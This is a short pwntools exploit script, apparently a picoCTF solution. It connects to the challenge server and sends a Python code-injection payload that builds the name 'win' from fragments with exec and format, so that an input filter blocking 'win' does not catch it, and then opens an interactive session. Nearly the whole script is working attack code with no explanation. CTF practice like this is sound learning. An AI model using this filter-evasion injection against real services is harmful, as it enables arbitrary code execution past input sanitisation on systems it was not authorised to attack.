from pwn import *

p = remote('saturn.picoctf.net', 56052)

#reading until '==> '
p.recvuntil(b'==> ')

# bypass filter that detect win from the user input 
user_input = "exec('{}{}{}()'.format('w', chr(105), 'n'))"

p.sendline(user_input.encode())

p.interactive()

p.close()
